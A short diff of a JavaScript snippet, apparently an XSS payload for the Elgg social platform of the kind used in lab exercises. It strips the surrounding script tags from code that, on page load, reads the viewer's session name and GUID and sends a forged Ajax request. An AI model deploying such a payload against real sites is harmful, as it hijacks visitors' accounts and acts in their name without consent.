@@ -1,4 +1,4 @@
-<script type="text/javascript">
+
 window.onload=function(){
     var userName="&name="+elgg.session.user.name;
     var guid="&guid="+elgg.session.user.guid;
@@ -16,4 +16,4 @@ window.onload=function(){
         Ajax.send(content);
     }
 }
-</script>  
+
